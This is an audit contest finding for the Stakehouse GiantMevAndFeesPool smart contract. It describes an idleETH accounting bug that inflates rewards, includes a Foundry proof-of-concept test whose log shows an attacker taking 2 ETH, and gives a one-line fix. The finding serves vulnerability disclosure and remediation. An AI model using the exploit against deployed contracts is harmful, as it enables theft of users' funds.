[H-10]GiantMevAndFeesPool.bringUnusedETHBackIntoGiantPoolfunction loses the addition of the idleETH which allows attackers to steal most of eth from the Giant Pool
Submitted byronnyx2017, also found byLambda
https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126-L138https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L176-L178
The contract GiantMevAndFeesPool override the function totalRewardsReceived:
return address(this).balance + totalClaimed - idleETH;
The function totalRewardsReceived is used as the current rewards balance to caculate the unprocessed rewards in the functionSyndicateRewardsProcessor._updateAccumulatedETHPerLP
uint256 received = totalRewardsReceived();uint256 unprocessed = received - totalETHSeen;
The idleETH will be decreased in the functionbatchDepositETHForStakingfor sending eth to the staking pool. But the idleETH wont be increased in the functionbringUnusedETHBackIntoGiantPoolwhich is used to burn lp tokens in the staking pool, and the staking pool will send the eth back to the giant pool. And then because of the diminution of the idleETH, theaccumulatedETHPerLPShareis added out of thin air. So the attacker can steal more eth from the GiantMevAndFeesPool.
Proof of Concept
test:test/foundry/TakeFromGiantPools.t.sol
pragma solidity ^0.8.13;// SPDX-License-Identifier: MITimport "forge-std/console.sol";import {GiantPoolTests} from "./GiantPools.t.sol";import { LPToken } from "../../contracts/liquid-staking/LPToken.sol";contract TakeFromGiantPools is GiantPoolTests {function testDWclaimRewards() public{address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether);address feesAndMevUserOne = accountTwo; vm.deal(feesAndMevUserOne, 4 ether);address feesAndMevUserTwo = accountThree; vm.deal(feesAndMevUserTwo, 4 ether);// Register BLS keyregisterSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);// Deposit ETH into giant fees and mevvm.startPrank(feesAndMevUserOne);giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);vm.stopPrank();vm.startPrank(feesAndMevUserTwo);giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);bytes[][] memory blsKeysForVaults = new bytes[][](1);blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);uint256[][] memory stakeAmountsForVaults = new uint256[][](1);stakeAmountsForVaults[0] = getUint256ArrayFromValues(4 ether);giantFeesAndMevPool.batchDepositETHForStaking(getAddressArrayFromValues(address(manager.stakingFundsVault())),getUint256ArrayFromValues(4 ether),blsKeysForVaults,stakeAmountsForVaults);vm.warp(block.timestamp+31 minutes);LPToken[] memory tokens = new LPToken[](1);tokens[0] = manager.stakingFundsVault().lpTokenForKnot(blsPubKeyOne);LPToken[][] memory allTokens = new LPToken[][](1);allTokens[0] = tokens;giantFeesAndMevPool.bringUnusedETHBackIntoGiantPool(getAddressArrayFromValues(address(manager.stakingFundsVault())),allTokens,stakeAmountsForVaults);// inject a NOOP to skip some functionsaddress[] memory stakingFundsVaults = new address[](1);bytes memory code = new bytes(1);code[0] = 0x00;vm.etch(address(0x123), code);stakingFundsVaults[0] = address(0x123);giantFeesAndMevPool.claimRewards(feesAndMevUserTwo, stakingFundsVaults, blsKeysForVaults);vm.stopPrank();console.log("user one:", getBalance(feesAndMevUserOne));console.log("user two(attacker):", getBalance(feesAndMevUserTwo));console.log("giantFeesAndMevPool:", getBalance(address(giantFeesAndMevPool)));}function getBalance(address addr) internal returns (uint){// giant LP : eth at ratio of 1:1return addr.balance + giantFeesAndMevPool.lpTokenETH().balanceOf(addr);}}
run test:
forge test --match-test testDWclaimRewards -vvv
test log:
Logs:user one: 4000000000000000000user two(attacker): 6000000000000000000giantFeesAndMevPool: 6000000000000000000
The attacker stole 2 eth from the pool.
Tools Used
foundry
Recommended Mitigation Steps
Add
idleETH += _amounts[i];
before burnLPTokensForETH in the GiantMevAndFeesPool.bringUnusedETHBackIntoGiantPool function.
vince0656 (Stakehouse) confirmed